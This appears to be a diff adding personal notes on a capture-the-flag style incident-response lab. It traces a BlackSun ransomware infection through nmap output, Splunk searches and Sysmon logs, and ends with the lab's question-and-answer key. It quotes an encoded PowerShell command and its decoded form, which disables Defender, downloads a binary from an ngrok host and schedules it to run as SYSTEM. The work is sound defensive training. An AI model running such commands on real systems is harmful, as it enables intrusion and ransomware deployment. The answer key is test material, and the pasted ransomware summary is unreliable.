@@ -157,3 +157,163 @@ PORT     STATE SERVICE         REASON  VERSION
 |     Content-Length: 85
 |_    looks like you are trying to access MongoDB over HTTP on the native driver port.
 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8191-TCP:V=7.93%I=7%D=3/24%Time=641DD730%P=x86_64-pc-linux-gnu%r(Ge
+SF:tRequest,A9,"HTTP/1\.0\x20200\x20OK\r\nConnection:\x20close\r\nContent-
+SF:Type:\x20text/plain\r\nContent-Length:\x2085\r\n\r\nIt\x20looks\x20like
+SF:\x20you\x20are\x20trying\x20to\x20access\x20MongoDB\x20over\x20HTTP\x20
+SF:on\x20the\x20native\x20driver\x20port\.\r\n")%r(FourOhFourRequest,A9,"H
+SF:TTP/1\.0\x20200\x20OK\r\nConnection:\x20close\r\nContent-Type:\x20text/
+SF:plain\r\nContent-Length:\x2085\r\n\r\nIt\x20looks\x20like\x20you\x20are
+SF:\x20trying\x20to\x20access\x20MongoDB\x20over\x20HTTP\x20on\x20the\x20n
+SF:ative\x20driver\x20port\.\r\n");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE
+Completed NSE
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 76.38 seconds
+
+Search : * Between: 05/16/2022 and 06/16/2022
+
+ 4,921 events (5/16/22 12:00:00.000 AM to 5/18/22 12:00:00.000 AM
+
+Interesting Fields
+
+C:\Windows\Temp\OUTSTANDING_GUTTER.exe
+
+search powershell.exe
+
+add field commandline
+
+powershell.exe -exec bypass -enc UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQA7AHcAZwBlAHQAIABoAHQAdABwADoALwAvADgAOAA2AGUALQAxADgAMQAtADIAMQA1AC0AMgAxADQALQAzADIALgBuAGcAcgBvAGsALgBpAG8ALwBPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlADsAUwBDAEgAVABBAFMASwBTACAALwBDAHIAZQBhAHQAZQAgAC8AVABOACAAIgBPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlACIAIAAvAFQAUgAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABDAE8AVQBUAFMAVABBAE4ARABJAE4ARwBfAEcAVQBUAFQARQBSAC4AZQB4AGUAIgAgAC8AUwBDACAATwBOAEUAVgBFAE4AVAAgAC8ARQBDACAAQQBwAHAAbABpAGMAYQB0AGkAbwBuACAALwBNAE8AIAAqAFsAUwB5AHMAdABlAG0ALwBFAHYAZQBuAHQASQBEAD0ANwA3ADcAXQAgAC8AUgBVACAAIgBTAFkAUwBUAEUATQAiACAALwBmADsAUwBDAEgAVABBAFMASwBTACAALwBSAHUAbgAgAC8AVABOACAAIgBPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlACIA
+
+from base64, remove null bytes
+
+Set-MpPreference -DisableRealtimeMonitoring $true;wget http://886e-181-215-214-32.ngrok.io/OUTSTANDING_GUTTER.exe -OutFile C:\Windows\Temp\OUTSTANDING_GUTTER.exe;SCHTASKS /Create /TN "OUTSTANDING_GUTTER.exe" /TR "C:\Windows\Temp\COUTSTANDING_GUTTER.exe" /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU "SYSTEM" /f;SCHTASKS /Run /TN "OUTSTANDING_GUTTER.exe"
+
+defang url: hxxp[://]886e-181-215-214-32[.]ngrok[.]io
+
+search OUTSTANDING_GUTTER.exe
+
+fields commandline
+
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoExit -Command [Console]::OutputEncoding=[Text.UTF8Encoding]::UTF8
+
+same search powershell.exe
+
+"C:\Windows\system32\schtasks.exe" /Create /TN OUTSTANDING_GUTTER.exe /TR C:\Windows\Temp\COUTSTANDING_GUTTER.exe /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU SYSTEM /f
+
+search OUTSTANDING_GUTTER.exe
+
+User: NT AUTHORITY\SYSTEM
+
+"C:\Windows\system32\schtasks.exe" /Run /TN OUTSTANDING_GUTTER.exe
+
+add filter QueryName
+
+9030-181-215-214-32.ngrok.io defanging url
+
+search .ps1
+
+C:\Windows\Temp\script.ps1
+
+search TargetFilename="C:\\Windows\\Temp\\script.ps1"
+
+look for hashes field
+
+SHA1=E0AFCF804394ABD43AD4723A0FEB147F10E589CD,MD5=3EBAB71CB71CA5C475202F401DE008C8,SHA256=E5429F2E44990B3D4E249C566FBF19741E671C0E40B809F87248D9EC9114BEF9,IMPHASH=00000000000000000000000000000000
+
+search on virustotal
+
+This indicator was mentioned in a report.  
+  
+🔎 Title: BlackSun Ransomware – The Dark Side of PowerShell  
+📑 Reference: https://blogs.vmware.com/security/2022/01/blacksun-ransomware-the-dark-side-of-powershell.html  
+📆 Report Publish Date:   
+📤 Sample Upload Date:   
+🏷️ Reference ID: #7cbb9afad (https://www.virustotal.com/gui/search/7cbb9afad/comments for report's related indicators)
+
+Go to details 
+Names
+
+-   523.mal
+ -   BlackSun.ps1
+
+Black Sun is a type of ransomware that encrypts a victim's files and demands payment in exchange for the decryption key. It was first discovered in 2021 and is known for its use of sophisticated encryption algorithms and evasion techniques.
+
+When a system is infected with Black Sun ransomware, the files on the computer or server are encrypted with a strong encryption algorithm. The attackers then demand payment in exchange for the decryption key that can unlock the encrypted files. Victims are typically given a deadline to pay the ransom, and if they fail to do so, the attackers threaten to delete the decryption key, making it impossible to recover the files.
+
+One example of a Black Sun ransomware attack is the one that targeted the New Zealand based insurance company, Tower Insurance in August 2021. The attackers demanded a ransom of $2 million in Bitcoin, threatening to release sensitive data stolen from the company's systems if the ransom was not paid. Tower Insurance declined to pay the ransom and worked with law enforcement agencies to investigate the attack and restore their systems.
+
+search .txt
+
+TargetFilename: C:\Users\keegan\Downloads\vasg6b0wmw029hd\BlackSun_README.txt
+
+05/16/2022 06:39:30 AM
+LogName=Microsoft-Windows-Sysmon/Operational
+EventCode=11
+EventType=4
+ComputerName=DESKTOP-TBV8NEF
+User=NOT_TRANSLATED
+Sid=S-1-5-18
+SidType=0
+SourceName=Microsoft-Windows-Sysmon
+Type=Information
+RecordNumber=7283
+Keywords=None
+TaskCategory=File created (rule: FileCreate)
+OpCode=Info
+Message=File created:
+RuleName: -
+UtcTime: .399
+ProcessGuid: {eea302a0-540e-6282-620f-000000000300}
+ProcessId: 4284
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\keegan\Downloads\vasg6b0wmw029hd\BlackSun_README.txt
+CreationUtcTime: .399
+User: NT AUTHORITY\SYSTEM
+
+search .jpg or just BlackSun
+
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Public\Pictures\blacksun.jpg
+CreationUtcTime: .514
+User: NT AUTHORITY\SYSTEM
+```
+A suspicious binary was downloaded to the endpoint. What was the name of the binary?
+*OUTSTANDING_GUTTER.exe*
+What is the address the binary was downloaded from? Add **http://** to your answer & defang the URL.
+Cyberchef can help with defanging the URL.
+*hxxp[://]886e-181-215-214-32[.]ngrok[.]io*
+What Windows executable was used to download the suspicious binary? Enter full path.
+*C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe*
+What command was executed to configure the suspicious binary to run with elevated privileges?
+Event Code 12 will help here. Note that the attacker tried multiple attempts to configure this command correctly
+*"C:\Windows\system32\schtasks.exe" /Create /TN OUTSTANDING_GUTTER.exe /TR C:\Windows\Temp\COUTSTANDING_GUTTER.exe /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU SYSTEM /f*
+What permissions will the suspicious binary run as? What was the command to run the binary with elevated privileges? **(Format:** **User + ; + CommandLine)**
+*NT AUTHORITY\SYSTEM;"C:\Windows\system32\schtasks.exe" /Run /TN OUTSTANDING_GUTTER.exe*
+The suspicious binary connected to a remote server. What address did it connect to? Add **http://** to your answer & defang the URL.
+Cyberchef can help with defanging the URL.
+*hxxp[://]9030-181-215-214-32[.]ngrok[.]io*
+A PowerShell script was downloaded to the same location as the suspicious binary. What was the name of the file?
+*script.ps1*
+The malicious script was flagged as malicious. What do you think was the actual name of the malicious script?
+Check VirusTotal for the hash of the PowerShell script.
+*BlackSun.ps1*
+A ransomware note was saved to disk, which can serve as an IOC. What is the full path to which the ransom note was saved?
+*C:\Users\keegan\Downloads\vasg6b0wmw029hd\BlackSun_README.txt*
+The script saved an image file to disk to replace the user's desktop wallpaper, which can also serve as an IOC. What is the full path of the image?
+*C:\Users\Public\Pictures\blacksun.jpg*
+
+## Notes / Lessons Learned
+[[NahamStore]]
+
